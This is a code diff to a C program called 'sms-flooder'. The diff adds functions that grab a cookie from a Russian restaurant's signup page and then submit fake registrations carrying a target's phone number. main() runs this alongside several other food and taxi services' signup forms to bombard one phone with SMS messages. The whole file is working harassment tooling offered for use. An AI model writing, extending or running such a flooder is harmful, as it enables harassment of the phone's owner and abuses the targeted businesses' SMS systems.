@@ -3,9 +3,10 @@
  *  ./sms-flooder
 */
 
-#include <stdio.h>
-#include <curl/curl.h>
-#include <stdlib.h>
+#include <stdio.h>      //
+#include <stdlib.h>     // rend();
+#include <curl/curl.h>  // for curl;
+#include <unistd.h>     // sleep();
 
 /* Get randon int */
 int GetRandInt (int min, int max){
@@ -322,6 +323,62 @@ void SmsDvepalochki(char* phone) {
     curl_global_cleanup();
 }
 
+/* Evrasia Get Cookie funk */
+void GetCookieEvrasia() {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://evrasia.spb.ru/signup/");
+        chunk = curl_slist_append(chunk, "Host: evrasia.spb.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./evrasia-cookie.txt");
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+}
+
+/* Evrasia Sms Flood func (!one sms only:( ))*/
+void SmsEvrasia(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[512];
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://evrasia.spb.ru/signup/");
+        chunk = curl_slist_append(chunk, "Host: evrasia.spb.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./evrasia-cookie.txt");
+
+        sprintf(Buf, "name=Sam&username=%%2B%c+%%28%c%c%c%%29+%c%c%c-%c%c-%c%c&mail=Q%dSW%%40gmail.com&bday=05%%2F11%%2F1998&dispatch1=sms&PERSONAL_GENDER=M&pers_data=yes", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10], GetRandInt(1, 1437));
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
 int main(void)
 {
     char phone[16];
@@ -337,16 +394,21 @@ int main(void)
     GetCookieDostaevsky();
     GetCookieTaxovichkof();
     GetCookieDvepalochki();
+    GetCookieEvrasia();
 
     /* Flood */
     SmsDelevery(phone);
     SmsDostaevsky(phone);
     SmsOllis(phone);
     SmsMfood(phone);
-    SmsTaxovichkof(phone); // 5 min timer
+    SmsTaxovichkof(phone); // (!5 min timer)
     SmsDvepalochki(phone);
+    SmsEvrasia(phone);     // (!one sms only)
+
+
 
     // system("clear");
     printf("\n[+] Done\n");
     return 0;
 }
+
